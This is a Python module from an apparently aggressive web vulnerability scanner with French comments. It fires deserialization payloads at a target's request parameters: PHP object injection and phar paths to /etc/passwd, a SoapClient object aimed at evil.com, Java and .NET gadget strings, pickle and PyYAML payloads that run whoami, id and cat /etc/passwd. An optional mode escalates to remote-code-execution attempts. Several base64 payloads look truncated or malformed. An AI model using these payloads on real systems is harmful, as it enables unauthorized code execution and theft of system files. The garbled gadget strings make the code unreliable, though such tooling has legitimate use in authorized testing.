#!/usr/bin/env python3
"""
🎭 DESERIALIZATION ATTACKS ULTRA-AGRESSIF — OWASP A05:2025
PHP unserialize, Java deserialization, Python pickle, .NET BinaryFormatter
"""

import base64
import pickle
import json
import re
from colorama import Fore, Style

class Deserialization:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self.vulns = []
    
    def scan(self, params=None):
        print(f"\n{Fore.CYAN}[🎭 DESERIALIZATION ATTACKS ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        params = params or getattr(self.engine, "discover_form_params", lambda: [])() or ["data", "payload", "object", "session", "state", "cookie", "user", "id", "q"]
        
        # Payloads de désérialisation par technologie
        deserialization_payloads = {
            'php': [
                # PHP Object Injection
                'O:8:"stdClass":0:{}',
                'O:1:"A":1:{s:4:"test";s:3:"foo";}',
                'a:2:{i:0;i:1;i:1;i:2;}',  # Array
                'b:1;i:1;',  # Boolean
                'd:1.2345600000000001;',  # Double
                'i:12345;',  # Integer
                'N;',  # NULL
                's:4:"test";',  # String
                
                # PHP Gadgets (Commons Collections equivalents)
                'O:15:"ErrorController":2:{s:4:"view";O:15:"FileViewHandler":1:{s:6:"file";s:9:"/etc/passwd";}}s:6:"action";s:6:"render";}',
                'O:16:"CacheController":2:{s:4:"cache";O:13:"FileCache":1:{s:4:"path";s:9:"/etc/passwd";}}s:6:"action";s:4:"load";}',
                
                # Phar deserialization
                'phar://test.txt/test',
                'phar://../../../../etc/passwd',
                
                # SoapClient SSRF
                'O:10:"SoapClient":2:{s:3:"uri";s:13:"http://evil.com";s:8:"location";s:13:"http://evil.com";}',
            ],
            'java': [
                # Java Commons Collections
                'rO0ABXNyABdqYXZhLnV0aWwuU2VyaWFsaXphYmxlAAAAAAAAAAICAAB4cgxaYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkADXRyYW5zZm9ybUZvcm1lcnQAE2phdmEuaW8uc2VyaWFsaXphYmxl',
                
                # ysoserial payloads
                'rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcEUufGWRJb+Tt4gIAAHhwAAAAEAAACAAAAAAQAAAAUdGVzdA==',
                
                # JRMP (Java RMI)
                'rO0ABXNyABdqYXZhLnJtaS5zZXJ2ZXIuUmVtb3RlSW52b2NhdGlvbgAAAAAAAAABAgADSgAFYWRkcgAGSW50',
                
                # Apache Commons FileUpload
                'rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZmFjdG9yeS5UcmFuc2Zvcm1lcgAAAAAAAAABAgAAeHB3BAAAAAV0A',
                
                # Spring Framework
                'rO0ABXNyABdvcmcuYXBhY2hlLnNwcmluZy5mcmFtZXdvcmsudXRpbC5TZXJpYWxpemVkSW52b2NhdGlvbkhhbmRsZXIAAAAAAAAAAAIAAAF0cgA'
            ],
            'python': [
                # Python pickle payloads (simplified to avoid lambda issues)
                'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.',
                'cos\nsystem\np0\n(Vcat /etc/passwd\np1\ntp2\nRp3\n.',
                'csubprocess\nPopen\np0\n((Vid\np1\ntp2\nRp3\n.',
                
                # Base64 encoded pickle
                'gASVBQAAAAAAAACMCGR1bW15X21vZGWUjAhfX3JlZHVjZV9flIaUaC5zeXN0ZW0FLAVpYwBzY3JpcHQ',
                
                # Unsafe pickle
                'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.',
                'cos\nsystem\np0\n(Vcat /etc/passwd\np1\ntp2\nRp3\n.',
                
                # PyYAML unsafe load
                '!!python/object/apply:os.system ["id"]',
                '!!python/object/apply:subprocess.Popen [["whoami"]]',
            ],
            'dotnet': [
                # .NET BinaryFormatter
                'AAEAAAD/////AQAAAAAAAAAMAgAAAE9TeXN0ZW0uUnVudGltZS5TZXJpYWxpemF0aW9uLkZvcm1hdHRlcnMuU29hcEphdmFTY3JpcHRpbmc',
                
                # ObjectDataProvider
                'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0uV2luZG93cy5NYXJrdXAuRXh0ZW5zaW9ucy5PYmplY3REYXRhUHJvdmlkZXI',
                
                # ResourceDictionary
                'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0uV2luZG93cy5NYXJrdXAuRXh0ZW5zaW9ucy5SZXNvdXJjZURpY3Rpb25hcnk',
                
                # XamlReader
                'AAEAAAD/////AQAAAAAAAAAMAgAAAE1TeXN0ZW0uV2luZG93cy5NYXJrdXAuWFhBTC5NYXJrdXAuWFhBbWw'
            ],
            'ruby': [
                # Ruby Marshal
                "\x04\bo:\x0ERuby\x00Object\x00",
                "\x04\bo:\x0cObjectSpace\x00",
                
                # Gem deserialization
                "\x04\bo:\x10Gem::Requirement\x00",
                "\x04\bo:\x0CGem::Specification\x00",
            ]
        }
        
        for param in params:
            print(f"  → Test paramètre: {param}")
            
            for tech, payloads in deserialization_payloads.items():
                for payload in payloads:
                    try:
                        # Encoder le payload selon la technologie
                        encoded_payload = self._encode_payload(payload, tech)
                        test_url = self.engine.build_url(param, encoded_payload)
                        
                        # Faire la requête
                        resp = self.engine.session.get(test_url, timeout=10)
                        
                        # Analyser la réponse
                        vuln_info = self._analyze_deserialization_response(resp, payload, tech, param, test_url)
                        if vuln_info:
                            self.vulns.append(vuln_info)
                            print(f"    {Fore.RED}[💥 DESERIALIZATION CONFIRMÉ] {param} ({tech}){Style.RESET_ALL}")
                            print(f"      Payload: {str(payload)[:60]}...")
                            print(f"      Preuve: {vuln_info['evidence']}")
                            
                            # Mode agressif : essayer RCE
                            if self.aggressive:
                                rce_result = self._try_deserialization_rce(param, tech)
                                if rce_result:
                                    print(f"    {Fore.YELLOW}[⚡ RCE CONFIRMÉ] {Style.RESET_ALL}{rce_result['payload'][:50]}...")
                                    self.vulns.append(rce_result)
                            break
                            
                    except Exception as e:
                        continue
        
        return self.vulns
    
    def _encode_payload(self, payload, tech):
        """Encoder le payload selon la technologie"""
        if tech == 'php':
            # URL encoder pour PHP
            import urllib.parse
            return urllib.parse.quote(str(payload))
        elif tech == 'java':
            # Base64 pour Java
            return base64.b64encode(str(payload).encode()).decode()
        elif tech == 'python':
            # Base64 pour Python pickle
            return base64.b64encode(str(payload).encode()).decode()
        elif tech == 'dotnet':
            # Base64 pour .NET
            return base64.b64encode(str(payload).encode()).decode()
        elif tech == 'ruby':
            # URL encoder pour Ruby Marshal
            import urllib.parse
            return urllib.parse.quote(str(payload))
        else:
            return str(payload)
    
    def _analyze_deserialization_response(self, resp, payload, tech, param, url):
        """Analyser la réponse pour détecter la désérialisation"""
        
        # Patterns d'erreur de désérialisation
        error_patterns = {
            'php': [
                r'unserialize\(\):.*error',
                r'__PHP_Incomplete_Class',
                r'Object of class.*could not be converted',
                r'Serialization failed',
                r'Invalid serialization data',
                r'expected parameter 1 to be string',
                r'Call to a member function.*on null'
            ],
            'java': [
                r'java\.io\.InvalidClassException',
                r'java\.io\.StreamCorruptedException',
                r'java\.lang\.ClassNotFoundException',
                r'java\.io\.NotSerializableException',
                r'ObjectInputStream\.readObject',
                r'InvalidObjectException'
            ],
            'python': [
                r'pickle\.UnpicklingError',
                r'AttributeError.*__reduce__',
                r'EOFError.*read',
                r'IndexError.*pop',
                r'pickle data was truncated',
                r'invalid load key'
            ],
            'dotnet': [
                r'SerializationException',
                r'InvalidCastException',
                r'MissingMethodException',
                r'ObjectDisposedException',
                r'ArgumentException.*serialization'
            ],
            'ruby': [
                r'Marshal\.data.*too short',
                r'ArgumentError.*dump format',
                r'TypeError.*dump',
                r'NoMethodError.*_dump'
            ]
        }
        
        # Vérifier les erreurs spécifiques à la technologie
        if tech in error_patterns:
            for pattern in error_patterns[tech]:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    return {
                        'type': 'deserialization',
                        'param': param,
                        'payload': str(payload),
                        'technology': tech,
                        'evidence': f'Deserialization error: {pattern}',
                        'url': url
                    }
        
        # RCE — indicateurs stricts (sortie commande, pas contenu générique)
        rce_indicators = ['root:x:0:0', 'www-data:x:33:', 'uid=0', 'gid=0']
        for indicator in rce_indicators:
            if indicator in resp.text and indicator not in str(payload):
                return {
                    'type': 'deserialization_rce',
                    'param': param,
                    'payload': str(payload),
                    'technology': tech,
                    'evidence': f'RCE confirmé: {indicator}',
                    'url': url
                }
        
        return None
    
    def _try_deserialization_rce(self, param, tech):
        """Essayer RCE via désérialisation"""
        rce_payloads = {
            'php': [
                'O:8:"stdClass":1:{s:4:"test";O:4:"Test":1:{s:6:"system";s:2:"id";}}',
                'a:1:{i:0;O:4:"Test":1:{s:4:"exec";s:2:"id";}}',
            ],
            'java': [
                # ysoserial CommonsCollections1
                'rO0ABXNyABdqYXZhLnV0aWwuU2VyaWFsaXphYmxlAAAAAAAAAAICAAB4cgxaYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkADXRyYW5zZm9ybUZvcm1lcnQAE2phdmEuaW8uc2VyaWFsaXphYmxl',
            ],
            'python': [
                # Simplified Python pickle payloads
                'cposix\nsystem\np0\n(Vid\np1\ntp2\nRp3\n.',
                'cos\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.',
            ],
            'dotnet': [
                # ObjectDataProvider with Process.Start
                'AAEAAAD/////AQAAAAAAAAAMAgAAAE9TeXN0ZW0uV2luZG93cy5NYXJrdXAuRXh0ZW5zaW9ucy5PYmplY3REYXRhUHJvdmlkZXI',
            ]
        }
        
        if tech in rce_payloads:
            for payload in rce_payloads[tech]:
                try:
                    encoded_payload = self._encode_payload(payload, tech)
                    test_url = self.engine.build_url(param, encoded_payload)
                    resp = self.engine.session.get(test_url, timeout=5)
                    
                    if self._check_rce_success(resp):
                        return {
                            'type': 'deserialization_rce',
                            'param': param,
                            'payload': str(payload),
                            'technology': tech,
                            'evidence': 'Remote Code Execution successful',
                            'url': test_url
                        }
                except:
                    continue
        
        return None
    
    def _check_rce_success(self, resp):
        """Vérifier si le RCE a réussi"""
        rce_indicators = [
            'root:', 'www-data:', 'uid=', 'gid=', 
            'bin/', 'etc/', 'proc/', 'dev/', 'usr/', 'var/',
            'Darwin', 'Linux', 'Windows', 'MINGW'
        ]
        return any(indicator in resp.text for indicator in rce_indicators)
